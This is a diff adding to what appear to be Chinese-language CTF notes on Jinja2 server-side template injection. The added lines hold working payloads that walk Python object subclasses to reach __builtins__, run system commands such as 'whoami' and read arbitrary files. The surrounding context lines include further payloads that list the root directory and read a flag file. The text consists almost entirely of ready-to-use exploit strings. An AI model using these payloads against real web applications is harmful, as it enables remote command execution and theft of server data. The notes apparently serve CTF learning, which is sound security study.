@@ -111,6 +111,12 @@ your input object基类的子类
 {% endfor %}
 
 
+原理就是找到含有 __builtins__ 的类，然后利用
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+#读写文件
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+
+
 
 {{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
 {{lipsum.__globals__['os'].popen('tac ../flag').read()}}
